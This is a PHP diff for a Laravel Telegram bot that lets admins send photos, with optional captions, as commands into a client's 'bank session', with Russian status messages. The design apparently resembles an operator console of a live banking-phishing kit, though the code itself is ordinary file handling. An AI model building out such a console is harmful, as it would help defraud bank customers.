@@ -6,6 +6,8 @@ use App\Enums\ActionType;
 use App\Events\BankSessionUpdated;
 use App\Models\Admin;
 use App\Models\BankSession;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\Str;
 use SergiX44\Nutgram\Nutgram;
 
 class MessageHandler
@@ -32,6 +34,65 @@ class MessageHandler
             'session'       => $this->handleSessionAction($bot, $admin, $pending, $text),
             default         => $admin->clearPendingAction(),
         };
+    }
+
+    public function handlePhoto(Nutgram $bot): void
+    {
+        /** @var Admin|null $admin */
+        $admin = $bot->get('admin');
+        if ($admin === null || !$admin->hasPendingAction()) {
+            return;
+        }
+
+        $pending = $admin->pending_action;
+        if (($pending['type'] ?? null) !== 'session') {
+            return;
+        }
+
+        $actionType = ActionType::tryFrom($pending['actionType'] ?? '');
+        if ($actionType === null || !$actionType->requiresPhoto()) {
+            return;
+        }
+
+        $session = BankSession::find($pending['sessionId'] ?? '');
+        if ($session === null) {
+            $admin->clearPendingAction();
+            $bot->sendMessage('Сессия не найдена; действие сброшено.');
+            return;
+        }
+
+        $photos = $bot->message()->photo ?? [];
+        if (empty($photos)) {
+            $bot->sendMessage('Не удалось получить фото. Попробуйте ещё раз.');
+            return;
+        }
+
+        $photo = end($photos);
+        $file  = $bot->getFile($photo->file_id);
+
+        $filePath  = $file->file_path ?? '';
+        $extension = pathinfo($filePath, PATHINFO_EXTENSION) ?: 'jpg';
+        $filename  = Str::uuid() . '.' . $extension;
+
+        $contents = file_get_contents(
+            'https://api.telegram.org/file/bot' . config('services.telegram.bot_token') . '/' . $filePath
+        );
+        Storage::disk('public')->put('bank-photos/' . $filename, $contents);
+        $photoUrl = Storage::disk('public')->url('bank-photos/' . $filename);
+
+        $caption = $bot->message()->caption ?? '';
+        $command = ['type' => $actionType->value, 'photo_url' => $photoUrl];
+        if ($actionType === ActionType::PhotoWithInput) {
+            $command['text'] = $caption;
+        }
+
+        $session->action_type      = $command;
+        $session->last_activity_at = now();
+        $session->save();
+
+        $admin->clearPendingAction();
+        BankSessionUpdated::dispatch($session);
+        $bot->sendMessage('✓ Фото отправлено клиенту.');
     }
 
     private function handleSessionAction(Nutgram $bot, Admin $admin, array $pending, string $text): void
